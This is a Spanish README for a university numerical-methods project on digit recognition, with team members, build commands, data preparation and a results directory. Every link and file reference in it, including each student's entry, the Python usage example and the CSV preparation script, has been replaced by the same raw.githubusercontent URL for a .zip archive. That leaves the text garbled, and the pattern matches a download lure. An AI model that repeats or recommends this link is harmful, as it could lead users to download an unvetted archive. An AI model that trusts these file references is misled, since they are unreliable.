# TP2 Métodos Numéricos - Reconocimiento de dígitos

## Integrantes

* F. Galileo Cappella Lewi, 653/20, https://raw.githubusercontent.com/janachure/f_metnum_tp2/main/informe/sections/tp-metnum-f-v2.7.zip
* Juan Pablo Anachure, 99/16, https://raw.githubusercontent.com/janachure/f_metnum_tp2/main/informe/sections/tp-metnum-f-v2.7.zip
* Octavio La Tessa, 477/16, https://raw.githubusercontent.com/janachure/f_metnum_tp2/main/informe/sections/tp-metnum-f-v2.7.zip

## Compilar

Se necesitan las siguientes librerías: `python3.6+`, `c++11/14/17` 
Para compilar se pueden correr los siguientes comandos:
~~~
git submodule update --init
make
~~~

El programa compilado genera un archivo que puede ser importado desde python, en el archivo `https://raw.githubusercontent.com/janachure/f_metnum_tp2/main/informe/sections/tp-metnum-f-v2.7.zip` se puede ver un ejemplo de cómo usarlo.

## Correr tests

~~~
WIP
~~~

## Correr analysis

Todos los experimentos tienen como parámetro principal `name`, que es el nombre del dataset en el directorio `data` sobre el que se va a trabajar. Luego también tienen parámetros específicos para cada experimento, esos están explicados en sus respectivos scripts.

### Preparar datos

El dataset tiene que ser un archivo `csv` con una columna titulada `label` de cualquier tipo enumerable y el resto de columnas que tienen que ser números. Se puede usar el script `https://raw.githubusercontent.com/janachure/f_metnum_tp2/main/informe/sections/tp-metnum-f-v2.7.zip` para usar cualquier csv.

### Resultados

Los resultados son guardados dentro del directorio `data/DATASET/EXPERIMENTO`
